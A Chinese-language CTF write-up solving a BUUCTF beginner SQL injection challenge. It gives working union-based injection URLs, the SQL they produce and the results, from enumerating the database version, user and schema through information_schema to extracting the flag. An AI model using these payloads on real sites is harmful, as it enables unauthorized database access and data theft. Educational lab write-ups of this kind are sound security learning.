## web入门SQL注入-1（[BUUCTF](https://buuoj.cn/challenges)）



### 0x00 判断注入点



```url
http://xxx:81/index.php?id=1
```



发现在id=-1时页面错误 此处有注入点，在id= 3 时 系统给出提示



```url
if too diffcult ,add &tips=1 to the url !
```



将提示输入URL



```url
http://xxx:81/index.php?id=3&tips=1
```



得到sql执行语句提示：



```sql
select * from notes where id ='1'
```



发现id是字符型使用“ ’ ” 闭合



### 0x01 使用‘# 绕过闭合 



**#注释后面语句**



```url
http://xxx:81/index.php?id=3'#&tips=1
```



SQL执行语句为



```sql
select * from notes where id ='3'#'
```



### 0x02 使用order by子句 判断列个数，判断出此页面的列为3个



```url
http://xxx:81/index.php?id=3`order by 3 #&tips=1
```



SQL执行语句为



```sql
select * from notes where id ='3'order by 3#'
```



### 0x03 使用union select 子句测试回显



```url
http://xxx:81/index.php?id=-3' union select 1,2,3 %23&tips=1
```



SQL执行语句为



```sql
select * from notes where id ='3' union select 1,2,3#'
```



得到回显



### 0x04查询数据库名称，用户，版本，操作系统



```url
查询数据库名称，用户

http://xxx:81/index.php?id=-3' union select 1,version(),user() %23&tips=1

查询版本，操作系统

http://xxx:81/index.php?id=-3' union select 1,database(),@@version_compile_os %23&tips=1
```



SQL执行语句为



```sql
select * from notes where id ='-3' union select 1,version(),user() #'

select * from notes where id ='-3' union select 1,database(),@@version_compile_os #'
```



得到

version()	`5.5.64-MariaDB-1ubuntu0.14.04.1`

user()		`root@logistical`

database()	`note`

操作系统		`debian-linux-gnu`



### 0x05查询note数据库下的所有表



```url
http://xxx.cn:81/index.php?id=-3' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='note'%23&tips=1
```



SQL执行语句为



```sql
select * from notes where id ='-3' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='note'#'
```



查询到的结果：



```
fl4g,notes
```



**判断fl4g表为目标表**



### 0x06查询fl4g表下的字段



```sql
http://xxx.cn:81/index.php?id=-3' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='fl4g'%23&tips=1
```



SQL执行语句为



```sql
select * from notes where id ='-3' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='fl4g'#'
```



查询结果为：**fllllag**



### 0x08查询**fllllag**列下数据



```url
http://xxx.cn:81/index.php?id=-3' union select 1,fllllag,3 from fl4g%23&tips=1 
```



SQL执行语句为



```sql
select * from notes where id ='-3' union select 1,fllllag,3 from fl4g#'
```



查询到flag为：**n1book{union_select_is_so_cool}**



### 0x09补充



##### `group_concat()`  将分组中的字符串与各种选项进行连接



##### “#”在URL中不作为有效字符传入SQL语句中，故采用URL编码%23代替



**在MYSQL5.0以上版本中，mysq1存在一个自带数据库名为 information_schema, 它是一个存储记录有所有数据库名，表名，列名的数据 库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。**



**information_schema.tables        记录所有表名信息的表**



**information_schema.columns        记录所有列名信息的表**



**table_name        表名**



**column_name        列名**



**table_schema        数据库名**



作者：

​		SihUi

